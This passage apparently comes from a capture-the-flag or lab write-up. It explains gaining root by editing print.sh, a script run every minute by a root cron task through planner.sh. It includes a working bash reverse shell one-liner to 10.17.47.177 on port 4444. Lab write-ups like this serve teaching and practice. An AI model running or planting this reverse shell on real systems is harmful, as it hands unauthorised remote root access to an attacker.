The output file is created by root! This means that root is running an automated task that runs the planner.sh script every minute. Now we can edit the print.sh script to get us a root shell instead of creating an output file. We can put the bash command(reverse shell) into the print.sh script.

**Command** - 
```python
bash -i >& /dev/tcp/10.17.47.177/4444 0>&1
```
